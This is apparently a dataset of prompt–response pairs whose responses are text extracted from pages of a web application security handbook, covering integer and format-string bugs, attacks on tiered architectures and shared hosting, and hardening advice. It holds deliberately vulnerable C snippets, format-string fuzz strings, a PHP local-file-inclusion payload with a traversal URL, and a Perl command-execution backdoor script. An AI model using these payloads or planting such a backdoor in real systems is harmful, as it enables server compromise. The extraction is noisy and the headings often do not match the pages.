    "output": "40 Stuttard c16.indd V2 - 08/16/2011 Page 641\nChapter 16 n Attacking Native Compiled Applications 641\nConsider the following “fi x” to the heap overfl ow described previously:\nbool CheckLogin(char* username, char* password)\n{\nunsigned short len = strlen(username) + 1;\nchar* _username = (char*) malloc(len);\nstrcpy(_username, username);\n...\nHere, the application measures the length of the user-submitted username,\nadds 1 to accommodate the trailing null, allocates a buffer of the resulting size,\nand then copies the username into it. With normal-sized input, this code behaves\nas intended. However, if the user submits a username of 65,535 characters, an\ninteger overfl ow occurs. A short-sized integer contains 16 bits, which is enough\nfor its value to range between 0 and 65,535. When a string of length 65,535 is\nsubmitted, the program adds 1 to this, and the value wraps to become 0. A\nzero-length buffer is allocated, and the long username is copied into it, caus-\ning a heap overfl ow. The attacker has effectively subverted the programmer’s\nattempt to ensure that the destination buffer is large enough.\nSignedness Errors\nThese occur when an application uses both signed and unsigned integers to\nmeasure the lengths of buffers and confuses them at some point. Either the\napplication makes a direct comparison between a signed and unsigned value,\nor it passes a signed value as a parameter to a function that takes an unsigned\nvalue. In both cases, the signed value is treated as its unsigned equivalent,\nmeaning that a negative number becomes a large positive number.\nConsider the following “fi x” to the stack overfl ow described previously:\nbool CheckLogin(char* username, int len, char* password)\n{\nchar _username[32] = “”;\nif (len < 32)\nstrncpy(_username, username, len);\n...\nHere, the function takes both the user-supplied username and a signed inte-\nger indicating its length. The programmer creates a fi xed-size buffer on the\nstack and checks whether the length is less than the size of the buffer. If it is,\nthe programmer performs a counted buffer copy, designed to ensure that the\nbuffer is not overfl owed.\nIf the len parameter is a positive number, this code behaves as intended.\nHowever, if an attacker can cause a negative value to be passed to the function,\nthe programmer’s protective check is subverted. The comparison with 32 still\ncc1166..iinndddd 664411 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Detecting Integer Vulnerabilities",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 642\n642 Chapter 16 n Attacking Native Compiled Applications\nsucceeds, because the compiler treats both numbers as signed integers. Hence,\nthe negative length is passed to the strncpy function as its count parameter.\nBecause strncpy takes an unsigned integer as this parameter, the compiler\nimplicitly casts the value of len to this type, so the negative value is treated as\na large positive number. If the user-supplied username string is longer than 32\nbytes, the buffer is overfl owed just as in a standard stack-based overfl ow.\nThis kind of attack usually is feasible only when the attacker can directly\ncontrol a length parameter. For example, perhaps it is computed by client-side\nJavaScript and submitted with a request alongside the string to which it refers.\nHowever, if the integer variable is small enough (for example, a short) and the\nprogram computes the length on the server side, an attacker may also be able\nto introduce a negative value via an integer overfl ow by submitting an overlong\nstring to the application.\nDetecting Integer Vulnerabilities\nNaturally, the primary locations to probe for integer vulnerabilities are any\ninstances where an integer value is submitted from the client to the server. This\nbehavior usually arises in two different ways:\nn The application may pass integer values in the normal way as parameters\nwithin the query string, cookies, or message body. These numbers usu-\nally are represented in decimal form using standard ASCII characters.\nThe most likely targets for testing are fi elds that appear to represent the\nlength of a string that is also being submitted.\nn The application may pass integer values embedded within a larger blob\nof binary data. This data may originate from a client-side component\nsuch as an ActiveX control, or it may have been transmitted via the client\nin a hidden form fi eld or cookie (see Chapter 5). Length-related integers\nmay be harder to identify in this context. They typically are represented\nin hexadecimal form and often directly precede the string or buffer to\nwhich they relate. Note that binary data may be encoded using Base64\nor similar schemes for transmission over HTTP.\nHACK STEPS\n1. Having identified targets for testing, you need to send suitable payloads\ndesigned to trigger any vulnerabilities. For each item of data being targeted,\nsend a series of different values in turn, representing boundary cases for the\nsigned and unsigned versions of different sizes of integer. For example:\nn 0x7f and 0x80 (127 and 128)\nn 0xff and 0x100 (255 and 256)\ncc1166..iinndddd 664422 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Format String Vulnerabilities",
    "output": "42 Stuttard c16.indd V2 - 08/16/2011 Page 643\nChapter 16 n Attacking Native Compiled Applications 643\nn 0x7ffff and 0x8000 (32767 and 32768)\nn 0xffff and 0x10000 (65535 and 65536)\nn 0x7fffffff and 0x80000000 (2147483647 and 2147483648)\nn 0xffffffff and 0x0 (4294967295 and 0)\n2. When the data being modified is represented in hexadecimal form, you\nshould send little-endian as well as big-endian versions of each test\ncase — for example, ff7f as well as 7fff. If hexadecimal numbers are sub-\nmitted in ASCII form, you should use the same case that the application\nitself uses for alphabetical characters to ensure that these are decoded\ncorrectly.\n3. You should monitor the application’s responses for anomalous events in\nthe same way as described for buffer overflow vulnerabilities.\nFormat String Vulnerabilities\nFormat string vulnerabilities arise when user-controllable input is passed as\nthe format string parameter to a function that takes format specifi ers that may\nbe misused, as in the printf family of functions in C. These functions take a\nvariable number of parameters, which may consist of different data types such\nas numbers and strings. The format string passed to the function contains speci-\nfi ers, which tell it what kind of data is contained in the variable parameters, and\nin what format it should be rendered.\nFor example, the following code outputs a message containing the value of\nthe count variable, rendered as a decimal:\nprintf(“The value of count is %d”, count.);\nThe most dangerous format specifi er is %n. This does not cause any data to\nbe printed. Rather, it causes the number of bytes output so far to be written to\nthe address of the pointer passed in as the associated variable parameter. For\nexample:\nint count = 43;\nint written = 0;\nprintf(“The value of count is %d%n.\\n”, count, &written.);\nprintf(“%d bytes were printed.\\n”, written);\noutputs the following:\nThe value of count is 43.\n24 bytes were printed.\ncc1166..iinndddd 664433 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Detecting Format String Vulnerabilities",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 644\n644 Chapter 16 n Attacking Native Compiled Applications\nIf the format string contains more specifi ers than the number of variable\nparameters passed, the function has no way of detecting this, so it simply con-\ntinues processing parameters from the call stack.\nIf an attacker controls all or part of the format string passed to a printf-\nstyle function, he can usually exploit this to overwrite critical parts of process\nmemory and ultimately cause arbitrary code execution. Because the attacker\ncontrols the format string, he can control both the number of bytes that the\nfunction outputs and the pointer on the stack that gets overwritten with the\nnumber of bytes output. This enables him to overwrite a saved return address,\nor a pointer to an exception handler, and take control of execution in much the\nsame way as in a stack overfl ow.\nDetecting Format String Vulnerabilities\nThe most reliable way to detect format string bugs in a remote application is to\nsubmit data containing various format specifi ers and monitor for any anomalies\nin the application’s behavior. As with uncontrolled triggering of buffer overfl ow\nvulnerabilities, it is likely that probing for format string fl aws will result in a\ncrash within a vulnerable application.\nHACK STEPS\n1. Targeting each parameter in turn, submit strings containing large numbers\nof the format specifiers %n and %s:\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\nNote that some format string operations may ignore the %n specifier for\nsecurity reasons. Supplying the %s specifier instead causes the function to\ndereference each parameter on the stack, probably resulting in an access\nviolation if the application is vulnerable.\n2. The Windows FormatMessage function uses specifiers in a different way\nthan the printf family. To test for vulnerable calls to this function, you\nshould use the following strings:\n%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...\n%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...\n3. Remember to URL-encode the % character as %25.\n4. You should monitor the application’s responses for anomalous events in\nthe same way as described for buffer overflow vulnerabilities.\ncc1166..iinndddd 664444 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Questions",
    "output": "44 Stuttard c16.indd V2 - 08/16/2011 Page 645\nChapter 16 n Attacking Native Compiled Applications 645\nSummary\nSoftware vulnerabilities in native code represent a relatively niche area in\nrelation to attacks on web applications. Most applications run in a managed\nexecution environment in which the classic software fl aws described in this\nchapter do not arise. However, occasionally these kinds of vulnerabilities are\nhighly relevant and have been found to affect many web applications running\non hardware devices and other unmanaged environments. A large proportion\nof such vulnerabilities can be detected by submitting a specifi c set of test cases\nto the server and monitoring its behavior.\nSome vulnerabilities in native applications are relatively easy to exploit, such\nas the off-by-one vulnerability described in this chapter. However, in most cases,\nthey are diffi cult to exploit given only remote access to the vulnerable application.\nIn contrast to most other types of web application vulnerabilities, even the act\nof probing for classic software fl aws is quite likely to cause a denial-of-service\ncondition if the application is vulnerable. Before performing any such testing,\nyou should ensure that the application owner accepts the inherent risks involved.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. Unless any special defenses are in place, why are stack-based buffer over-\nfl ows generally easier to exploit than heap-based overfl ows?\n2. In the C and C++ languages, how is a string’s length determined?\n3. Why would a buffer overfl ow vulnerability in an off-the-shelf network\ndevice normally have a much higher likelihood of exploitation than an\noverfl ow in a proprietary web application running on the Internet?\n4. Why would the following fuzz string fail to identify many instances of\nformat string vulnerabilities?\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n...\n5. You are probing for buffer overfl ow vulnerabilities in a web application\nthat makes extensive use of native code components. You fi nd a request\nthat may contain a vulnerability in one of its parameters; however, the\nanomalous behavior you have observed is diffi cult to reproduce reliably.\nSometimes submitting a long value causes an immediate crash. Sometimes\nyou need to submit it several times in succession to cause a crash. And\nsometimes a crash occurs after a large number of benign requests.\nWhat is the most likely cause of the application’s behavior?\ncc1166..iinndddd 664455 88//1199//22001111 1122::1166::3366 PPMM\ncc1166..iinndddd 664466 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Tiered Architectures",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 647\nCHAPTER\n17\nAttacking Application\nArchitecture\nWeb application architecture is an important area of security that is frequently\noverlooked when the security of individual applications is appraised. In com-\nmonly used tiered architectures, a failure to segregate different tiers often means\nthat a single defect in one tier can be exploited to fully compromise other tiers\nand therefore the entire application.\nA different range of security threats arises in environments where multiple\napplications are hosted on the same infrastructure, or even share common\ncomponents of a wider overarching application. In these situations, defects\nor malicious code within one application can sometimes be exploited to com-\npromise the entire environment and other applications belonging to different\ncustomers. The recent rise of “cloud” computing has increased the exposure of\nmany organizations to attacks of this kind.\nThis chapter examines a range of different architectural confi gurations and\ndescribes how you can exploit defects within application architectures to advance\nyour attack.\nTiered Architectures\nMost web applications use a multitiered architecture, in which the application’s\nuser interface, business logic, and data storage are divided between multiple\nlayers, which may use different technologies and be implemented on different\n647\ncc1177..iinndddd 664477 88//1199//22001111 1122::1177::1155 PPMM"
  },
  {
    "input": "Attacking Tiered Architectures",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 648\n648 Chapter 17 n Attacking Application Architecture\nphysical computers. A common three-tier architecture involves the following\nlayers:\nn Presentation layer, which implements the application’s interface\nn Application layer, which implements the core application logic\nn Data layer, which stores and processes application data\nIn practice, many complex enterprise applications employ a more fi ne-grained\ndivision between tiers. For example, a Java-based application may use the\nfollowing layers and technologies:\nn Application server layer (such as Tomcat)\nn Presentation layer (such as WebWork)\nn Authorization and authentication layer (such as JAAS or ACEGI)\nn Core application framework (such as Struts or Spring)\nn Business logic layer (such as Enterprise Java Beans)\nn Database object relational mapping (such as Hibernate)\nn Database JDBC calls\nn Database server\nA multitiered architecture has several advantages over a single-tiered design.\nAs with most types of software, breaking highly complex processing tasks into\nsimple and modular functional components can provide huge benefi ts in terms\nof managing the application’s development and reducing the incidence of bugs.\nIndividual components with well-defi ned interfaces can be easily reused both\nwithin and between different applications. Different developers can work in\nparallel on components without requiring a deep understanding of the imple-\nmentation details of other components. If it is necessary to replace the technol-\nogy used for one of the layers, this can be achieved with minimal impact on\nthe other layers. Furthermore, if well implemented, a multitiered architecture\ncan help enhance the security posture of the whole application.\nAttacking Tiered Architectures\nA consequence of the previous point is that if defects exist within the implemen-\ntation of a multitiered architecture, these may introduce security vulnerabilities.\nUnderstanding the multitiered model can help you attack a web application by\nhelping you identify where different security defenses (such as access controls\nand input validation) are implemented and how these may break down across\ntier boundaries. A poorly designed tiered architecture may make possible three\nbroad categories of attacks:\nn You may be able to exploit trust relationships between different tiers to\nadvance an attack from one tier to another.\ncc1177..iinndddd 664488 88//1199//22001111 1122::1177::1155 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 649\nChapter 17 n Attacking Application Architecture 649\nn If different tiers are inadequately segregated, you may be able to lever-\nage a defect within one tier to directly undercut the security protections\nimplemented at another tier.\nn Having achieved a limited compromise of one tier, you may be able to\ndirectly attack the infrastructure supporting other tiers and therefore\nextend your compromise to those tiers.\nWe will examine these attacks in more detail.\nExploiting Trust Relationships Between Tiers\nDifferent tiers of an application may trust one another to behave in particular\nways. When the application is functioning as normal, these assumptions may\nbe valid. However, in anomalous conditions or when under active attack, they\nmay break down. In this situation, you may be able to exploit these trust relation-\nships to advance an attack from one tier to another, increasing the signifi cance\nof the security breach.\nOne common trust relationship that exists in many enterprise applications is\nthat the application tier has sole responsibility for managing user access. This\ntier handles authentication and session management and implements all logic\nthat determines whether a particular request should be granted. If the applica-\ntion tier decides to grant a request, it issues the relevant commands to other\ntiers to carry out the requested actions. Those other tiers trust the application\ntier to carry out access control checks properly, and therefore they honor all\ncommands they receive from the application tier.\nThis type of trust relationship effectively exacerbates many of the common\nweb vulnerabilities examined in earlier chapters. When a SQL injection fl aw\nexists, it can often be exploited to access all data the application owns. Even if\nthe application does not access the database as DBA, it typically uses a single\naccount that can read and update all the application’s data. The database tier\neffectively trusts the application tier to properly control access to its data.\nIn a similar way, application components often run using powerful operating\nsystem accounts that have permission to carry out sensitive actions and access\nkey fi les. In this confi guration, the operating system layer effectively trusts\nthe relevant application tiers to not perform undesirable actions. If an attacker\nfi nds a command injection fl aw, he can often fully compromise the underlying\noperating system supporting the compromised application tier.\nTrust relationships between tiers can also lead to other problems. If program-\nming errors exist within one application tier, these may lead to anomalous\nbehavior in other tiers. For example, the race condition described in Chapter 11\ncauses the back-end database to serve up account information belonging to the\nwrong user. Furthermore, when administrators are investigating an unexpected\nevent or security breach, audit logs within trusting tiers normally are insuf-\nfi cient to fully understand what has occurred, because they simply identify the\ncc1177..iinndddd 664499 88//1199//22001111 1122::1177::1155 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 650\n650 Chapter 17 n Attacking Application Architecture\ntrusted tier as the agent of the event. For example, following a SQL injection\nattack, database logs may record every query injected by the attacker. But to\ndetermine the user responsible, you must cross-reference these events with\nentries in the logs of the application tier, which may or may not be adequate to\nidentify the perpetrator.\nSubverting Other Tiers\nIf different tiers of the application are inadequately segregated, an attacker who\ncompromises one tier may be able to directly undercut the security protections\nimplemented at another tier to perform actions or access data that that tier is\nresponsible for controlling.\nThis kind of vulnerability often arises in situations where several different\ntiers are implemented on the same physical computer. This architectural con-\nfi guration is common practice in situations where cost is a key factor.\nAccessing Decryption Algorithms\nMany applications encrypt sensitive user data to minimize the impact of appli-\ncation compromise, often to meet regulatory or compliance requirements such\nas PCI. Although passwords can be salted and hashed to ensure that they can-\nnot be determined even if the data store is compromised, a different approach\nis needed for data where the application needs to recover the corresponding\nplaintext value. The most common examples of this are a user’s security ques-\ntions (which may be verifi ed interactively with a help desk) and payment card\ninformation (which is needed to process payments). To achieve this, a two-way\nencryption algorithm is employed. A typical fl aw when using encryption is that\na logical separation is not obtained between encryption keys and the encrypted\ndata. A simple fl awed separation when encryption is introduced into an exist-\ning environment is to locate the algorithm and associated keys within the data\ntier, which avoids impacting the rest of the code. But if the data tier were ever\ncompromised, for example via a SQL injection attack, locating and executing\nthe decryption function would be a simple step for an attacker.\nNOTE Regardless of the encryption process, if the application is able to\ndecrypt information, and the application becomes fully compromised, an\nattacker can always fi nd a logical route to the decryption algorithm.\nUsing File Read Access to Extract MySQL Data\nMany small applications use a LAMP server (a single computer running the\nopen source software Linux, Apache, MySQL, and PHP). In this architecture,\ncc1177..iinndddd 665500 88//1199//22001111 1122::1177::1155 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 651\nChapter 17 n Attacking Application Architecture 651\na fi le disclosure vulnerability within the web application tier, which on its\nown may not represent a critical defect, can result in unrestricted access to all\napplication data. This is true because MySQL data is stored in human-readable\nfi les that the web application process is often authorized to read. Even if the\ndatabase implements strict access control over its data, and the application uses\na range of different low-privileged accounts to connect to the database, these\nprotections may be entirely undercut if an attacker can gain direct access to the\ndata held within the database tier.\nFor example, the application shown in Figure 17-1 allows users to choose a\nskin to customize their experience. This involves selecting a cascading style\nsheets (CSS) fi le, which the application presents to the user for review.\nFigure 17-1: An application containing a function to view a selected file\nIf this function contains a path traversal vulnerability (see Chapter 10), an\nattacker can exploit this to gain direct access to arbitrary data held within the\nMySQL database. This allows him to undercut the controls implemented within\nthe database tier. Figure 17-2 shows a successful attack retrieving the usernames\nand password hashes from the MySQL user table.\ncc1177..iinndddd 665511 88//1199//22001111 1122::1177::1155 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 652\n652 Chapter 17 n Attacking Application Architecture\nFigure 17-2: An attack that undercuts the database tier to retrieve arbitrary data\nTIP If an attacker has fi le-write access, he can try to write to the applica-\ntion’s confi guration, or write to a hosted virtual directory to get command\nexecution. See the nslookup example in Chapter 10.\nUsing Local File Inclusion to Execute Commands\nMost languages contain a function that allows a local fi le to be included within\nthe current script. The ability for an attacker to specify any fi le on the fi lesystem\nis undeniably a high-risk issue. Such a fi le could be the /etc/passwd fi le or a\nconfi guration fi le containing a password. In these cases the risk of information\ndisclosure is obvious, but the attacker cannot necessarily escalate the attack to\nfurther compromise the system (unlike with remote fi le inclusion, as described\nin Chapter 10). However, it may still be possible for an attacker to execute com-\nmands by including a fi le whose contents he partially controls, as a result of\nother application or platform features.\nConsider an application that takes user input within the country parameter\nin the following URL:\nhttp://eis/mdsecportal/prefs/preference_2?country=en-gb\ncc1177..iinndddd 665522 88//1199//22001111 1122::1177::1155 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 653\nChapter 17 n Attacking Application Architecture 653\nA user can modify the country parameter to include arbitrary fi les. One\npossible attack might be to request URLs containing script commands so that\nthese are written to the web server log fi le and then include this log fi le using\nthe local fi le inclusion behavior.\nAn interesting method exploiting an architectural quirk in PHP is that PHP\nsession variables are written to fi le in cleartext, named using the session token.\nFor example, the fi le:\n/var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7\nmay contain the following content, which includes a user-confi gured nickname:\nlogged_in|i:1;id|s:2:”24”;username|s:11:”manicsprout”;nickname|s:22:\n“msp”;privilege|s:1:”1”;\nAn attacker may be able to exploit this behavior by fi rst setting his nickname\nto <?php passthru(id);?>, as shown in Figure 17-3. He can then include his\nsession fi le to cause the id command to be executed using the following URL,\nas shown in Figure 17-4:\nhttp://eis/mdsecportal/prefs/preference_2.php?country=../../../../../../\n../../var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7%00\nFigure 17-3: Configuring a nickname containing server-executable script code\ncc1177..iinndddd 665533 88//1199//22001111 1122::1177::1166 PPMM"
  },
  {
    "input": "Securing Tiered Architectures",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 654\n654 Chapter 17 n Attacking Application Architecture\nFigure 17-4: Executing the session file containing the malicious nickname via the\nlocal file inclusion function\nHACK STEPS\n1. As described throughout this book, for any vulnerability you iden-\ntify within the application, think imaginatively about how this can be\nexploited to achieve your objectives. Countless successful hacks against\nweb applications begin from a vulnerability that is intrinsically limited\nin its impact. By exploiting trust relationships and undercutting controls\nimplemented elsewhere within the application, it may be possible to\nleverage a seemingly minor defect to carry out a serious breach.\n2. If you succeed in performing arbitrary command execution on any compo-\nnent of the application, and you can initiate network connections to other\nhosts, consider ways of directly attacking other elements of the applica-\ntion’s infrastructure at the network and operating system layers to expand\nthe scope of your compromise.\nSecuring Tiered Architectures\nIf carefully implemented, a multitiered architecture can considerably enhance\nan application’s security, because it localizes the impact of a successful attack.\nIn the basic LAMP confi guration described previously, in which all compo-\nnents run on a single computer, the compromise of any tier is likely to lead\nto complete compromise of the application. In a more secure architecture, the\ncompromise of one tier may result in partial control over an application’s data\nand processing, but it may be more limited in its impact and perhaps contained\nto the affected tier.\nMinimize Trust Relationships\nAs far as possible, each tier should implement its own controls to defend against\nunauthorized actions and should not trust other application components to\ncc1177..iinndddd 665544 88//1199//22001111 1122::1177::1166 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 655\nChapter 17 n Attacking Application Architecture 655\nprevent security breaches that the tier itself can help block. Here are some\nexamples of this principle being applied to different tiers of the application:\nn The application server tier can enforce role-based access control over specifi c\nresources and URL paths. For example, the application server can verify\nthat any request for the /admin path was received from an administrative\nuser. Controls can also be imposed over different kinds of resources, such\nas specifi c types of scripts and static resources. This mitigates the impact\nof certain kinds of access control defects within the web application tier,\nbecause users who are not authorized to access certain functionality will\nhave their request blocked before it reaches that tier.\nn The database server tier can provide various accounts for use by the applica-\ntion for different users and different actions. For example, actions on behalf\nof unauthenticated users can be carried out with a low-privileged account\nallowing read-only access to a restricted set of data. Different categories\nof authenticated users can be assigned different database accounts, grant-\ning read-and-write access to different subsets of the application’s data, in\nline with the user’s role. This mitigates the impact of many SQL injection\nvulnerabilities, because a successful attack may result in no further access\nthan the user could legitimately obtain by using the application as intended.\nn All application components can run using operating system accounts\nthat possess the least level of privileges required for normal operation.\nThis mitigates the impact of any command injection or fi le access fl aws\nwithin these components. In a well-designed and fully hardened architec-\nture, vulnerabilities of this kind may provide an attacker with no useful\nopportunities to access sensitive data or perform unauthorized actions.\nSegregate Different Components\nAs far as possible, each tier should be segregated from interacting with other\ntiers in unintended ways. Implementing this objective effectively may in some\ncases require different components to run on different physical hosts. Here are\nsome examples of this principle being applied:\nn Different tiers should not have read- or write-access to fi les used by other\ntiers. For example, the application tier should not have any access to the\nphysical fi les used to store database data, and should only be able to\naccess this data in the intended manner using database queries with an\nappropriate user account.\nn Network-level access between different infrastructure components should\nbe fi ltered to permit only services with which different application tiers\nare intended to communicate. For example, the server hosting the main\ncc1177..iinndddd 665555 88//1199//22001111 1122::1177::1166 PPMM"
  },
  {
    "input": "Shared Hosting and Application Service Providers",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 656\n656 Chapter 17 n Attacking Application Architecture\napplication logic may be permitted to communicate with the database\nserver only via the port used to issue SQL queries. This precaution will\nnot prevent attacks that actually use this service to target the database\ntier. But it will prevent infrastructure level attacks against the database\nserver, and it will contain any operating system level compromise from\nreaching the organization’s wider network.\nApply Defense in Depth\nDepending on the exact technologies in use, a variety of other protections can\nbe implemented within different components of the architecture to support the\nobjective of localizing the impact of a successful attack. Here are some examples\nof these controls:\nn All layers of the technology stack on every host should be security hardened,\nin terms of both confi guration and vulnerability patching. If a server’s\noperating system is insecure, an attacker exploiting a command injection\nfl aw with a low-privileged account may be able to escalate privileges to\nfully compromise the server. The attack may then propagate through the\nnetwork if other hosts have not been hardened. On the other hand, if the\nunderlying servers are secured, an attack may be fully contained within\none or more tiers of the application.\nn Sensitive data persisted in any tier of the application should be encrypted\nto prevent easy disclosure in the event that that tier is compromised. User\ncredentials and other sensitive information, such as credit card numbers,\nshould be stored in encrypted form within the database. Where available,\nbuilt-in protection mechanisms should be used to protect database cre-\ndentials held on the web application tier. For example, in ASP.NET 2.0, an\nencrypted database connection string can be stored in the web.config fi le.\nShared Hosting and Application Service Providers\nMany organizations use external providers to help deliver their web applica-\ntions to the public. These arrangements range from simple hosting services\nin which an organization is given access to a web and/or database server, to\nfull-fl edged application service providers (ASPs) that actively maintain the\napplication on behalf of the organization. Arrangements of this kind are ideal\nfor small businesses that do not have the skills or resources to deploy their own\napplication, but they are also used by some high-profi le companies to deploy\nspecifi c applications.\nMost providers of web and application hosting services have many custom-\ners and typically support multiple customers’ applications using the same\ncc1177..iinndddd 665566 88//1199//22001111 1122::1177::1166 PPMM"
  },
  {
    "input": "Shared Application Services",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 657\nChapter 17 n Attacking Application Architecture 657\ninfrastructure, or closely connected infrastructures. An organization that chooses\nto use one of these services therefore must consider the following related threats:\nn A malicious customer of the service provider may attempt to interfere\nwith the organization’s application and its data.\nn An unwitting customer may deploy a vulnerable application that enables\nmalicious users to compromise the shared infrastructure and thereby\nattack the organization’s application and its data.\nWeb sites hosted on shared systems are prime targets for script kiddies seek-\ning to deface as many web sites as possible, because compromising a single\nshared host can often enable them to attack hundreds of apparently autonomous\nweb sites in a short period of time.\nVirtual Hosting\nIn simple shared hosting arrangements, a web server may simply be confi gured\nto support multiple virtual web sites with different domain names. This is\nachieved via the Host header, which is mandatory in HTTP version 1.1. When\na browser issues an HTTP request, it includes a Host header containing the\ndomain name contained in the relevant URL and sends the request to the IP\naddress associated with that domain name. If multiple domain names resolve\nto the same IP address, the server at this address can still determine which\nweb site the request is for. For example, Apache can be confi gured to support\nmultiple web sites using the following confi guration, which sets a different web\nroot directory for each virtually hosted site:\n<VirtualHost *>\nServerName wahh-app1.com\nDocumentRoot /www/app1\n</VirtualHost>\n<VirtualHost *>\nServerName wahh-app2.com\nDocumentRoot /www/app2\n</VirtualHost>\nShared Application Services\nMany ASPs provide ready-made applications that can be adapted and customized\nfor use by their customers. This model is cost-effective in industries where large\nnumbers of businesses need to deploy highly functional and complex applications that\nprovide essentially the same functionality to their end users. By using the services\nof an ASP, businesses can quickly acquire a suitably branded application without\nincurring the large setup and maintenance costs that this would otherwise involve.\ncc1177..iinndddd 665577 88//1199//22001111 1122::1177::1166 PPMM"
  },
  {
    "input": "Attacking Shared Environments",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 658\n658 Chapter 17 n Attacking Application Architecture\nThe market for ASP applications is particularly mature in the fi nancial services\nindustry. For example, a given country may have thousands of small retailers\nthat want to offer their customers in-store payment cards and credit facilities.\nThese retailers outsource this function to dozens of different credit card provid-\ners, many of whom are themselves start-ups rather than long-established banks.\nThese credit card providers offer a commoditized service in which cost is the\nmain discriminator. Accordingly, many of them use an ASP to deliver the web\napplication that is provided to end users. Within each ASP, the same application\ntherefore is customized for a huge number of different retailers.\nFigure 17-5 illustrates the typical organization and division of responsibilities\nin this kind of arrangement. As you can see from the numerous agents and tasks\ninvolved, this setup involves the same kinds of security problems as the basic shared\nhosting model; however, the issues involved may be more complex. Furthermore,\nadditional problems are specifi c to this arrangement, as described in the next section.\nHost and maintain infrastructure,\ndevelop core application, provide\nApplication Service updates and support\nProvider (ASP)\nCustomize core\nfunctionality according to\ntheir business offering\nCredit card companies\nCustomize application\nskin and non-functional\ncontent\nHigh street retailers\nUse applications to\naccess statements\n& make payments\nEnd users\nFigure 17-5: The organization of a typical application service provider\nAttacking Shared Environments\nShared hosting and ASP environments introduce a range of new potential\nvulnerabilities by which an attacker can target one or more applications within\nthe shared infrastructure.\nAttacks Against Access Mechanisms\nBecause various external organizations have a legitimate need to update and\ncustomize the different applications in a shared environment, the provider\ncc1177..iinndddd 665588 88//1199//22001111 1122::1177::1166 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 659\nChapter 17 n Attacking Application Architecture 659\nneeds to implement mechanisms by which this remote access can be achieved.\nIn the simplest case of a virtually hosted web site, this may merely involve an\nupload facility such as FTP or SCP, via which customers can write fi les within\ntheir own web root.\nIf the hosting arrangement includes provision of a database, customers may\nneed to obtain direct access to confi gure their own database setup and retrieve\ndata that the application has stored. In this situation, providers may implement\na web interface to certain database administrative functions or may even expose\nthe actual database service on the Internet, allowing customers to connect\ndirectly and use their own tools.\nIn full-blown ASP environments, where different types of customers need to\nperform different levels of customization on elements of the shared application,\nproviders often implement highly functional applications that customers can\nuse for these tasks. These are often accessed via a virtual private network (VPN)\nor a dedicated private connection into the ASP’s infrastructure.\nGiven the range of remote access mechanisms that may exist, a number of\ndifferent attacks may be possible against a shared environment:\nn The remote access mechanism itself may be insecure. For example, the\nFTP protocol is unencrypted, enabling a suitably positioned attacker (for\nexample, within a customer’s own ISP) to capture login credentials. Access\nmechanisms may also contain unpatched software vulnerabilities or con-\nfi guration defects that enable an anonymous attacker to compromise the\nmechanism and interfere with customers’ applications and data.\nn The access granted by the remote access mechanism may be overly liberal\nor poorly segregated between customers. For example, customers may be\ngiven a command shell when they require only fi le access. Alternatively,\ncustomers may not be restricted to their own directories and may be able\nto update other customers’ content or access sensitive fi les on the server\noperating system.\nn The same considerations apply to databases as for fi lesystem access. The\ndatabase may not be properly segregated, with different instances for\neach customer. Direct database connections may use unencrypted chan-\nnels such as standard ODBC.\nn When a customized application is deployed for the purpose of remote access\n(for example, by an ASP), this application must take on the responsibility\nof controlling different customers’ access to the shared application. Any\nvulnerabilities within the administrative application may allow a malicious\ncustomer or even an anonymous user to interfere with the applications of\nother customers. They may also allow customers with the limited capa-\nbility to update their application’s skin to escalate privileges and modify\nelements of the core functionality involved in their application to their\ncc1177..iinndddd 665599 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 660\n660 Chapter 17 n Attacking Application Architecture\nadvantage. Where this kind of administrative application is deployed,\nany kind of vulnerability within this application may provide a vehicle\nto attack the shared application accessed by end users.\nAttacks Between Applications\nIn a shared hosting environment, different customers typically have a legitimate\nneed to upload and execute arbitrary scripts on the server. This immediately\nraises problems that do not exist in single-hosted applications.\nDeliberate Backdoors\nIn the most obvious kind of attack, a malicious customer may upload content\nthat attacks the server itself or other customers’ applications. For example, con-\nsider the following Perl script, which implements a remote command facility\non the server:\n#!/usr/bin/perl\nuse strict;\nuse CGI qw(:standard escapeHTML);\nprint header, start_html(“”);\nif (param()){my $command = param(“cmd”);\n$command=`$command`;\nprint “$command\\n”;}\nelse {print start_form(); textfield(“command”);}\nprint end_html;\nAccessing this script over the Internet enables the customer to execute arbi-\ntrary operating system commands on the server:\nGET /scripts/backdoor.pl?cmd=whoami HTTP/1.1\nHost: wahh-maliciousapp.com\nHTTP/1.1 200 OK\nDate: Sun, 03 Jul 2011 19:16:38 GMT\nServer: Apache/2.0.59\nConnection: close\nContent-Type: text/html; charset=ISO-8859-1\n<!DOCTYPE html\nPUBLIC “-//W3C//DTD XHTML 1.0 